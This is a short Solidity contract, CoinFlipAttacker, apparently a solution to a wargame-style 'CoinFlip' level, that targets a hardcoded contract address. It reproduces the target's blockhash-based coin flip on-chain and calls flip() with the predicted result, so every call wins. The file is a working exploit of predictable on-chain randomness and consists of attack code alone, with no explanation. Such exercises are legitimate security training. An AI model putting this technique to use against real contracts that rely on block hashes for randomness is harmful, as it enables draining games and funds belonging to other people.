// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "./CoinFlip.sol";

contract CoinFlipAttacker {
  using SafeMath for uint256;
  CoinFlip target = CoinFlip(0x865c9500404e1BBAa7ce5C51986c7ea39503301C);
  uint256 lastHash;
  uint256 FACTOR =
    57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function getSolution() public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;
    return side;
  }

  function attack() public {
    target.flip(this.getSolution());
  }

  function getConsecutiveWins() public view returns (uint256) {
    return target.consecutiveWins();
  }
}

